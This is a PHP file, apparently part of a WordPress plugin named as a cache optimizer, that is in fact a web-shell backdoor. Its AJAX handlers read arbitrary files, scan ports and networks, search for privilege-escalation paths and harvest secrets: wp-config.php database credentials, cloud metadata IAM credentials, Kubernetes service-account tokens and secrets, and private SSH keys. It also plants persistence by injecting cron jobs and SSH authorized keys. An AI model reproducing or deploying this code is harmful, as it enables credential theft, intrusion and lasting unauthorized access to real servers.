                $states=['01'=>'ESTABLISHED','02'=>'SYN_SENT','03'=>'SYN_RECV','04'=>'FIN_WAIT1','05'=>'FIN_WAIT2','06'=>'TIME_WAIT','07'=>'CLOSE','08'=>'CLOSE_WAIT','09'=>'LAST_ACK','0A'=>'LISTEN','0B'=>'CLOSING'];
                $dec=function($hex){[$h,$p]=explode(':',$hex);$ip=implode('.',array_reverse(array_map('hexdec',str_split($h,2))));return"$ip:".hexdec($p);};
                $result=[];
                foreach ($lines as $l) {
                    $p=preg_split('/\s+/',trim($l));
                    if (count($p)<4) continue;
                    $result[]=$dec($p[1]).' -> '.$dec($p[2]).' ['.($states[strtoupper($p[3])]??$p[3]).']';
                }
                wp_send_json_success(['output'=>$result?implode("\n",$result):'No connections']);
                break;

            case 'docker_check':
                $info=[];
                $info[]='/.dockerenv    : '.(@file_exists('/.dockerenv')?'EXISTS':'not found');
                $info[]='hostname       : '.@gethostname();
                $cg=@file_get_contents('/proc/1/cgroup');
                if ($cg) { $info[]='/proc/1/cgroup :'; foreach(array_filter(explode("\n",$cg)) as $l) $info[]="  $l"; }
                $env=@file_get_contents('/proc/self/environ');
                if ($env&&(strpos($env,'container=')!==false||strpos($env,'DOCKER')!==false||strpos($env,'KUBERNETES')!==false))
                    $info[]='Container env vars: DETECTED';
                wp_send_json_success(['output'=>implode("\n",$info)]);
                break;

            /* ── PHP FILTER ── */
            case 'filter_read':
                $fpath=$_POST['path']??''; $enc=$_POST['enc']??'base64';
                if (!$fpath) { wp_send_json_error('No path'); break; }
                if ($enc==='base64') $wrap="php://filter/convert.base64-encode/resource=$fpath";
                elseif ($enc==='rot13') $wrap="php://filter/string.rot13/resource=$fpath";
                elseif ($enc==='zlib') $wrap="php://filter/zlib.deflate/convert.base64-encode/resource=$fpath";
                else $wrap=$fpath;
                $raw=@file_get_contents($wrap);
                if ($raw===false) { wp_send_json_error("Cannot read: $fpath"); break; }
                $decoded=$enc==='base64'?base64_decode($raw):$raw;
                wp_send_json_success(['output'=>$decoded,'raw'=>$raw,'enc'=>$enc]);
                break;

            /* ── NETWORK ── */
            case 'port_scan':
                $host=$_POST['host']??''; $ports_str=$_POST['ports']??'22,80,443,3306,5432,6379,8080';
                if (!$host) { wp_send_json_error('No host'); break; }
                $ports=array_map('intval',array_filter(explode(',',$ports_str)));
                $open=$closed=[];
                foreach ($ports as $port) {
                    $s=@fsockopen($host,$port,$errno,$errstr,0.3);
                    if ($s) { $open[]=$port; fclose($s); } else $closed[]=$port;
                }
                wp_send_json_success(['host'=>$host,'open'=>$open,'closed'=>$closed,'output'=>"Host: $host\nOpen  : ".(implode(', ',$open)?:'none')."\nClosed: ".implode(', ',$closed)]);
                break;

            case 'arp_scan':
                $raw=@file_get_contents('/proc/net/arp');
                wp_send_json_success(['output'=>$raw?:rc_exec('arp -a 2>/dev/null || ip neigh 2>/dev/null',ABSPATH)['output']]);
                break;

            case 'iface':
                $raw=@file_get_contents('/proc/net/dev');
                $out=($raw?$raw."\n":'').rc_exec('ip addr 2>/dev/null || ifconfig 2>/dev/null',ABSPATH)['output'];
                wp_send_json_success(['output'=>trim($out)]);
                break;

            /* ── PRIVESC ── */
            case 'suid_find':
                $out=rc_exec('find / -perm -4000 -type f 2>/dev/null | head -50',ABSPATH)['output'];
                if (!$out) {
                    $suid=[];
                    foreach (['/bin','/sbin','/usr/bin','/usr/sbin','/usr/local/bin'] as $d)
                        foreach (@glob("$d/*")?:[] as $f) { $p=@fileperms($f); if($p!==false&&($p&04000)) $suid[]="$f (".substr(sprintf('%o',$p),-4).")"; }
                    $out=$suid?implode("\n",$suid):'None found or blocked';
                }
                wp_send_json_success(['output'=>$out]);
                break;

            case 'sgid_find':
                $out=rc_exec('find / -perm -2000 -type f 2>/dev/null | head -50',ABSPATH)['output'];
                wp_send_json_success(['output'=>$out?:'None found']);
                break;

            case 'world_write':
                $out=rc_exec('find / -perm -0002 \( -type d -o -type f \) 2>/dev/null | grep -v /proc | head -60',ABSPATH)['output'];
                wp_send_json_success(['output'=>$out?:'None found or blocked']);
                break;

            case 'cap_find':
                $out=rc_exec('getcap -r / 2>/dev/null | head -50',ABSPATH)['output'];
                if (!$out) $out=rc_exec('cat /proc/self/status 2>/dev/null | grep Cap',ABSPATH)['output'];
                wp_send_json_success(['output'=>$out?:'No capabilities found']);
                break;

            case 'sudo_list':
                $out=rc_exec('sudo -l -n 2>&1',ABSPATH)['output'];
                wp_send_json_success(['output'=>$out?:'sudo not available or permission denied']);
                break;

            case 'cred_scan':
                $found=[];
                $wpc=ABSPATH.'wp-config.php';
                if (@file_exists($wpc)) {
                    $src=@file_get_contents($wpc);
                    if ($src) foreach (['DB_USER','DB_PASSWORD','DB_HOST','AUTH_KEY','SECURE_AUTH_KEY','AUTH_SALT','SECURE_AUTH_SALT'] as $k)
                        if (@preg_match('/define[^,]+'.preg_quote($k,'/').'\s*,\s*[\'"]([^\'"]+)/s',$src,$m)) $found[]=$k.' = '.$m[1];
                }
                $out=rc_exec("grep -rn --include='*.php' --include='*.env' --include='*.conf' --include='*.ini' -l 'password\|passwd\|secret\|api_key\|DB_PASS' ".escapeshellarg(ABSPATH)." 2>/dev/null | head -20",ABSPATH)['output'];
                if ($out) $found=array_merge($found,array_filter(explode("\n",$out)));
                wp_send_json_success(['output'=>$found?implode("\n",$found):'Nothing found']);
                break;

            /* ── CLOUD METADATA ── */
            case 'aws_meta':
                $tok_ctx=@stream_context_create(['http'=>['timeout'=>2,'method'=>'PUT','header'=>"X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n"]]);
                $tok=@file_get_contents('http://169.254.169.254/latest/api/token',false,$tok_ctx)?:'';
                $ctx=@stream_context_create(['http'=>['timeout'=>3,'header'=>$tok?"X-aws-ec2-metadata-token: $tok\r\n":'']]);
                $meta=@file_get_contents('http://169.254.169.254/latest/meta-data/',false,$ctx);
                if ($meta===false) { wp_send_json_success(['output'=>'AWS IMDS not reachable']); break; }
                $iid=@file_get_contents('http://169.254.169.254/latest/meta-data/instance-id',false,$ctx);
                $reg=@file_get_contents('http://169.254.169.254/latest/meta-data/placement/region',false,$ctx);
                $role=@file_get_contents('http://169.254.169.254/latest/meta-data/iam/security-credentials/',false,$ctx);
                $out="=== AWS IMDS ===\nInstance: $iid\nRegion  : $reg\nIAM Role: $role\n\nKeys:\n$meta";
                if ($role) {
                    $creds=@file_get_contents("http://169.254.169.254/latest/meta-data/iam/security-credentials/".trim($role),false,$ctx);
                    if ($creds) $out.="\n=== Credentials ===\n$creds";
                }
                wp_send_json_success(['output'=>$out]);
                break;

            case 'gcp_meta':
                $ctx=@stream_context_create(['http'=>['timeout'=>3,'header'=>"Metadata-Flavor: Google\r\n"]]);
                $meta=@file_get_contents('http://metadata.google.internal/computeMetadata/v1/?recursive=true',false,$ctx);
                wp_send_json_success(['output'=>$meta?:'GCP metadata not reachable']);
                break;

            case 'azure_meta':
                $ctx=@stream_context_create(['http'=>['timeout'=>3,'header'=>"Metadata: true\r\n"]]);
                $meta=@file_get_contents('http://169.254.169.254/metadata/instance?api-version=2021-02-01',false,$ctx);
                wp_send_json_success(['output'=>$meta?:'Azure IMDS not reachable']);
                break;

            case 'do_meta':
                $ctx=@stream_context_create(['http'=>['timeout'=>3]]);
                $meta=@file_get_contents('http://169.254.169.254/metadata/v1.json',false,$ctx);
                wp_send_json_success(['output'=>$meta?:'DigitalOcean metadata not reachable']);
                break;

            case 'k8s_check':
                $sadir='/var/run/secrets/kubernetes.io/serviceaccount';
                $token=@file_get_contents("$sadir/token"); $ns=@file_get_contents("$sadir/namespace");
                if ($token===false) { wp_send_json_success(['output'=>'Not in a Kubernetes pod (no SA token)']); break; }
                $out="Namespace : ".($ns?:'?')."\nCA cert   : ".(@file_exists("$sadir/ca.crt")?'EXISTS':'not found')."\nToken[100]: ".substr($token,0,100)."...";
                $api=getenv('KUBERNETES_SERVICE_HOST')?:($_SERVER['KUBERNETES_SERVICE_HOST']??'');
                if ($api) {
                    $port=getenv('KUBERNETES_SERVICE_PORT')?:'443';
                    $ctx=@stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false],'http'=>['timeout'=>3,'header'=>"Authorization: Bearer $token\r\n"]]);
                    $secrets=@file_get_contents("https://$api:$port/api/v1/namespaces/".trim($ns)."/secrets",false,$ctx);
                    if ($secrets) $out.="\n=== K8s Secrets ===\n$secrets";
                }
                wp_send_json_success(['output'=>$out]);
                break;

            /* ── CRON / SSH ── */
            case 'cron_read':
                $out=[];
                foreach (['/etc/crontab','/etc/anacrontab'] as $f) { $c=@file_get_contents($f); if($c!==false) $out[]="=== $f ===\n$c"; }
                foreach (@glob('/etc/cron.d/*')?:[] as $f) { $c=@file_get_contents($f); if($c) $out[]="=== $f ===\n$c"; }
                foreach (['/var/spool/cron','/var/spool/cron/crontabs'] as $s) {
                    if (@is_dir($s)) foreach (@glob("$s/*")?:[] as $f) { $c=@file_get_contents($f); if($c) $out[]="=== $f ===\n$c"; }
                }
                $ct=rc_exec('crontab -l 2>&1',ABSPATH)['output'];
                if ($ct&&strpos($ct,'no crontab')===false) $out[]="=== crontab -l ===\n$ct";
                wp_send_json_success(['output'=>$out?implode("\n\n",$out):'No crontabs found or permission denied']);
                break;

            case 'ssh_keys':
                $out=[];
                $homes=[['root','/root']];
                $passwd=@file_get_contents('/etc/passwd');
                if ($passwd) foreach (explode("\n",$passwd) as $line) {
                    $p=explode(':',$line);
                    if (count($p)>=7&&((int)$p[2]===0||((int)$p[2]>=1000&&(int)$p[2]<65000))) $homes[]=[$p[0],$p[5]];
                }
                foreach (array_unique($homes,SORT_REGULAR) as [$uname,$home]) {
                    foreach (['.ssh/authorized_keys','.ssh/id_rsa','.ssh/id_ed25519','.ssh/id_ecdsa'] as $kf) {
                        $kp=rtrim($home,'/').'/'.$kf; $c=@file_get_contents($kp);
                        if ($c!==false) $out[]="=== $uname:$kp ===\n$c";
                    }
                }
                wp_send_json_success(['output'=>$out?implode("\n\n",$out):'No SSH keys found or permission denied']);
                break;

            case 'cron_inject':
                $cmd=$_POST['cmd']??''; $interval=$_POST['interval']??'* * * * *';
                if (!$cmd) { wp_send_json_error('No command'); break; }
                $entry="$interval $cmd";
                $tmp=@tempnam(sys_get_temp_dir(),'cron_');
                $existing=rc_exec('crontab -l 2>/dev/null',ABSPATH)['output'];
                @file_put_contents($tmp,($existing&&strpos($existing,'no crontab')===false?$existing."\n":'').$entry."\n");
                $out2=rc_exec("crontab $tmp 2>&1",ABSPATH)['output'];
                @unlink($tmp);
                if (!$out2||strpos(strtolower($out2),'error')!==false) {
                    $spool='/var/spool/cron/'.@get_current_user();
                    $ok=@file_put_contents($spool,(@file_get_contents($spool)?:'').$entry."\n",FILE_APPEND);
                    $out2=$ok!==false?'Injected via direct spool write':'Both methods failed';
                } else $out2="Injected via crontab: $entry";
                wp_send_json_success(['output'=>$out2,'entry'=>$entry]);
                break;

            case 'ssh_inject':
                $key=trim($_POST['key']??''); $home=rtrim($_POST['home']??'','/');
                if (!$key) { wp_send_json_error('No key'); break; }
                if (!$home) $home=@exec('echo $HOME')?:'/root';
                $ssh_dir="$home/.ssh"; $ak="$ssh_dir/authorized_keys";
                if (!@is_dir($ssh_dir)) @mkdir($ssh_dir,0700,true);
                $existing=@file_get_contents($ak)?:'';
                if (strpos($existing,$key)!==false) { wp_send_json_success(['output'=>'Key already exists']); break; }
                if (@file_put_contents($ak,$existing.($existing?"\n":'').$key."\n")!==false) {
                    @chmod($ak,0600);
                    wp_send_json_success(['output'=>"Key injected to $ak"]);
                } else wp_send_json_error("Cannot write to $ak");
                break;

            default:
                wp_send_json_error('Unknown bypass op: '.$op);
        }
    }
}

new WP_Cache_Optimizer();
